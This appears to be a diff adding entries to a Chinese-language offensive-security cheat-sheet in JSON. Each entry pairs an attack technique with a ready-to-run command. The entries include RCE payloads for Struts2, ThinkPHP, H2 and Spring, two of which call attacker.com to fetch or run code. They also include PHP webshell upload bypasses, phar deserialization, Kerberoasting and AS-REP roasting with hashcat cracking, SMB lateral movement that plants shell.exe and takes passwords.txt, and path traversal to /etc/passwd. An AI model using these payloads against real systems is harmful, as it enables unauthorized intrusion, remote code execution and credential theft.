+    "command": "for p in actuator/actuator/health actuator/actuator/env actuator/actuator/heapdump actuator/actuator/jolokia actuator/actuator/trace actuator/actuator/logfile; do\n  echo -n \"$p -> \"; curl -s -o /dev/null -w \"%{http_code}\" https://target.com/$p; echo\ndone",
+    "description": "遍历常见 Spring Actuator 端点，检查 /env、/heapdump、/jolokia 等高危路径是否未鉴权。",
+    "tags": ["Spring", "未授权访问"]
+  },
+  {
+    "id": "s-148",
+    "title": "Druid Monitor 未授权访问检测",
+    "tool": "curl",
+    "category": "漏洞利用",
+    "command": "curl -s https://target.com/druid/ | grep -iE '监控|datasource|spring|DataSource'\ncurl -s https://target.com/druid/datasource.html -o ds.html -w \"%{http_code}\"",
+    "description": "Druid monitor 默认 /druid/ 路径，检查是否存在未授权访问及敏感信息泄露。",
+    "tags": ["Druid", "未授权访问"]
+  },
+  {
+    "id": "s-149",
+    "title": "Swagger / OpenAPI 未授权接口暴露",
+    "tool": "curl / gobuster",
+    "category": "漏洞利用",
+    "command": "gobuster dir -u https://target.com -w ~/wordlists/swagger.txt -e -k\n# 常见路径：\n/swagger-ui.html / /v2/api-docs / /v3/api-docs / /openapi.json / /api-docs",
+    "description": "探测是否存在 Swagger 文档路径，未鉴权时可直接调用接口寻找敏感功能。",
+    "tags": ["Swagger", "未授权访问"]
+  },
+  {
+    "id": "s-150",
+    "title": "H2 Console 未授权访问 + JDBC RCE",
+    "tool": "curl / H2",
+    "category": "漏洞利用",
+    "command": "curl -s https://target.com/h2-console/\n# JNDI 字符串连接：\njdbc:h2:mem:db;MODE=MYSQL;DATABASE_TO_LOWER=TRUE;INIT=CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd);return \"\";}$$;CALL SHELLEXEC('curl attacker.com')",
+    "description": "H2 控制台未授权 + 可自定义 JDBC URL 时，可通过 CREATE ALIAS 执行系统命令。",
+    "tags": ["H2", "RCE", "未授权访问"]
+  },
+  {
+    "id": "s-151",
+    "title": "GraphQL 内省查询获取 schema",
+    "tool": "curl",
+    "category": "漏洞利用",
+    "command": "curl -X POST https://target.com/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"{__schema{queryType{name}mutationType{name}types{name fields{name args{name type{name}}}}}}\"}'\n# InQL / GraphQL Voyager 可可视化 schema\n",
+    "description": "通过 __schema 内省查询 GraphQL 的查询、变更、字段、参数，快速了解 API 攻击面。",
+    "tags": ["GraphQL", "内省"]
+  },
+  {
+    "id": "s-152",
+    "title": "GraphQL 接口鉴权绕过与越权",
+    "tool": "curl / InQL",
+    "category": "漏洞利用",
+    "command": "# 尝试访问 mutation：\ncurl -X POST https://target.com/graphql -d '{\"query\":\"mutation { deleteUser(id: 1) }\"}'\n# 深度嵌套 + 别名批量查询：\ncurl -X POST https://target.com/graphql -d '{\"query\":\"{ u1: user(id:1){email} u2: user(id:2){email} }\"}'",
+    "description": "许多 GraphQL mutation 缺乏鉴权，或可通过别名遍历对象 ID 实现越权枚举。",
+    "tags": ["GraphQL", "鉴权绕过"]
+  },
+  {
+    "id": "s-153",
+    "title": "REST API 鉴权绕过：IDOR 水平越权",
+    "tool": "curl",
+    "category": "漏洞利用",
+    "command": "curl -H \"Authorization: Bearer <token_of_user_1001>\" https://target.com/api/users/1002/profile\n# 替换自增 ID / UUID / username 进行越权尝试",
+    "description": "REST API 中替换 URL 中对象 ID 查看是否可读取其他用户资源，属于 IDOR。",
+    "tags": ["API", "IDOR"]
+  },
+  {
+    "id": "s-154",
+    "title": "REST API 版本/调试接口探测",
+    "tool": "curl / gobuster",
+    "category": "漏洞利用",
+    "command": "for v in /v1 /v2 /api/v1 /api/v1.0 /internal /debug /_matrix /admin; do\n  curl -s -o /dev/null -w \"$v -> %{http_code}\\n\" https://target.com$v/users\ndone",
+    "description": "很多 API 在 v2 做鉴权但 v1 未回收，或 internal/debug 路径未鉴权。",
+    "tags": ["API", "路径探测"]
+  },
+  {
+    "id": "s-155",
+    "title": "文件上传：扩展名绕过（双后缀/大小写）",
+    "tool": "Burp / curl",
+    "category": "漏洞利用",
+    "command": "shell.php.jpg\nshell.phtml\nshell.php5\nshell.PHP\nshell.php%00.jpg\n# PUT /upload HTTP/1.1\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.jpeg\"",
+    "description": "中间件/前端后缀解析不一致时，上传 PHP 文件伪装成 jpg 由 Apache/Nginx 错误解析执行。",
+    "tags": ["文件上传", "后缀绕过"]
+  },
+  {
+    "id": "s-156",
+    "title": "文件上传：Content-Type 伪造 + 文件头伪造",
+    "tool": "Burp",
+    "category": "漏洞利用",
+    "command": "Content-Type: image/gif\n# body 前四字节：\nGIF89a<?php system($_GET['c']); ?>",
+    "description": "当应用仅校验 Content-Type 与文件头魔数时，构造伪 GIF/PNG 头 + PHP 内容即可绕过。",
+    "tags": ["文件上传", "Content-Type"]
+  },
+  {
+    "id": "s-157",
+    "title": "文件上传：.htaccess / .user.ini 解析劫持",
+    "tool": "Apache / Nginx",
+    "category": "漏洞利用",
+    "command": "# .htaccess 内容：\nAddType application/x-httpd-php .jpg\n\n# .user.ini 内容（PHP CGI/FPM）：\nauto_prepend_file=shell.jpg\nupload_max_filesize=100M",
+    "description": "Apache 允许上传 .htaccess 或 PHP CGI 场景上传 .user.ini，可让任意后缀被当作 PHP 执行。",
+    "tags": ["文件上传", ".htaccess"]
+  },
+  {
+    "id": "s-158",
+    "title": "文件上传：phar:// 反序列化",
+    "tool": "PHP / phar",
+    "category": "漏洞利用",
+    "command": "# 生成 phar 文件（phpggc）\nphp -d phar.readonly=0 phpggc -p phar -o shell.phar Laravel/RCE1 'id'\n# 将 phar 重命名为 .jpg 上传，目标以 phar:// 解析即可触发：\ninclude('phar://./uploads/shell.jpg');",
+    "description": "phar 文件的 meta 区存在序列化数据，PHP 以 phar:// 协议访问时会反序列化。",
+    "tags": ["文件上传", "phar", "反序列化"]
+  },
+  {
+    "id": "s-159",
+    "title": "Impacket GetNPUsers AS-REP Roasting",
+    "tool": "impacket",
+    "category": "漏洞利用",
+    "command": "python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.0.0.1\n# 爆破：\nhashcat -m 18200 asrep.txt rockyou.txt",
+    "description": "对不需要 Kerberos 预鉴权的用户，用 GetNPUsers 拉取可离线爆破的 AS-REP 票据。",
+    "tags": ["AD", "AS-REP", "impacket"]
+  },
+  {
+    "id": "s-160",
+    "title": "Impacket GetUserSPNs Kerberoast",
+    "tool": "impacket",
+    "category": "漏洞利用",
+    "command": "python3 GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.1 -request -format hashcat -outputfile spns.txt\nhashcat -m 13100 spns.txt rockyou.txt",
+    "description": "请求带 SPN 的账户的 TGS 并导出 RC4_HMAC_MD5 票据离线爆破。",
+    "tags": ["AD", "Kerberoast", "impacket"]
+  },
+  {
+    "id": "s-161",
+    "title": "BloodHound 采集 ingester（SharpHound / AzureHound）",
+    "tool": "BloodHound",
+    "category": "信息收集",
+    "command": "SharpHound.exe -c All --zipfilename bh.zip\n# BloodHound 中拖入 bh.zip，查询路径：\nMATCH p=shortestPath((m:User)-[*1..]->(n:Computer)) RETURN p\nMATCH (u:User {name:'JOHN'}) RETURN u",
+    "description": "采集 AD 关系数据后在 BloodHound 中可视化攻击路径（GenericAll、WriteDacl 等）。",
+    "tags": ["AD", "BloodHound"]
+  },
+  {
+    "id": "s-162",
+    "title": "Impacket smbclient.py / smbexec.py 横向",
+    "tool": "impacket",
+    "category": "漏洞利用",
+    "command": "python3 smbclient.py 'domain/user:pass@10.0.0.50'\n> use C$\n> put shell.exe\n> get passwords.txt\n\npython3 smbexec.py 'domain/user:pass@10.0.0.50'\n",
+    "description": "通过 SMB 协议远程列出共享、上传下载文件，或基于 SMB 的命令执行工具 smbexec。",
+    "tags": ["AD", "SMB", "impacket"]
+  },
+  {
+    "id": "s-163",
+    "title": "Java Struts2 S2-045 / S2-057 RCE Payload",
+    "tool": "Struts2",
+    "category": "漏洞利用",
+    "command": "curl -H \"Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):...).(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter().print('PWNED'))}\" http://target.com/",
+    "description": "基于 OGNL 的 Struts2 Content-Type 解析漏洞，是经典 Java 框架 RCE 之一。",
+    "tags": ["Java", "Struts2", "RCE"]
+  },
+  {
+    "id": "s-164",
+    "title": "Java Spring Boot Actuator RCE (CVE-2018-1270)",
+    "tool": "Spring",
+    "category": "漏洞利用",
+    "command": "POST /actuator/env\nContent-Type: application/x-www-form-urlencoded\nname=spring.cloud.bootstrap.location&value=http://attacker.com:8888/evil.yml\n# 随后触发 /actuator/restart 加载远程 yml 中的 SPEL",
+    "description": "Spring Cloud Gateway / spring.cloud.bootstrap.location 未鉴权 + SPEL 可 RCE。",
+    "tags": ["Java", "Spring", "SPEL"]
+  },
+  {
+    "id": "s-165",
+    "title": "Node.js Prototype Pollution 示例检测",
+    "tool": "Node.js",
+    "category": "漏洞利用",
+    "command": "# 验证脚本\nconst obj = {}; JSON.parse('{\"__proto__\": {\"polluted\": 1}}', (k,v) => { if(k) obj[k]=v; return v; });\nconsole.log(obj.polluted, {}.polluted);\n# 实战：配合 EJS/Render 等引擎 -> RCE",
+    "description": "检查 Node 应用的 JSON/merge 逻辑是否存在原型污染，后续可与模板渲染组合触发 RCE。",
+    "tags": ["Node.js", "原型污染"]
+  },
+  {
+    "id": "s-166",
+    "title": "Node.js Express 目录穿越与路径探测",
+    "tool": "curl",
+    "category": "漏洞利用",
+    "command": "curl -v \"https://target.com/static/../package.json\"\ncurl -v \"https://target.com/static/..%2f..%2fetc/passwd\"\ncurl -v \"https://target.com/../../../../etc/passwd\"",
+    "description": "Express 静态资源服务若未对路径做规范化，可读取敏感文件（package.json、源码）。",
+    "tags": ["Node.js", "路径穿越"]
+  },
+  {
+    "id": "s-167",
+    "title": "PHP Thinkphp / Laravel RCE（Thinkphp 5.x RCE）",
+    "tool": "PHP / Thinkphp",
+    "category": "漏洞利用",
+    "command": "curl \"http://target.com/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id\"\ncurl \"http://target.com/?s=index/think\\request/input&filter=system&data=id\"",
+    "description": "Thinkphp 5.0/5.1 在未开启强制路由时存在变量覆盖导致的任意函数调用。",
+    "tags": ["PHP", "Thinkphp", "RCE"]
+  },
+  {
+    "id": "s-168",
+    "title": "Golang Gin / net/pprof 调试接口探测",
+    "tool": "Go",
+    "category": "漏洞利用",
+    "command": "for p in /debug/pprof/ /debug/pprof/cmdline /debug/pprof/goroutine /debug/pprof/profile /debug/vars /metrics; do\n  echo -n \"$p -> \"; curl -s -o /dev/null -w \"%{http_code}\\n\" https://target.com$p\ndone",
+    "description": "Golang 默认开启 net/http/pprof 时会暴露 /debug/pprof/* 路径，可泄露堆栈、源码路径、进程信息。",
+    "tags": ["Golang", "pprof", "信息泄露"]
+  },
+  {
+    "id": "s-169",
+    "title": "Golang path-traversal Gin static 目录穿越",
+    "tool": "Go / Gin",
+    "category": "漏洞利用",
+    "command": "curl \"https://target.com/static/../go.mod\"\ncurl \"https://target.com/assets/..%2f..%2fetc/passwd\"\n# Gin 版本 < 1.6.0 存在 filepath.Clean 处理问题",
+    "description": "早期 Gin 静态文件服务未规范化路径，存在读取任意文件的目录穿越漏洞。",
+    "tags": ["Golang", "Gin", "路径穿越"]
+  }
+]
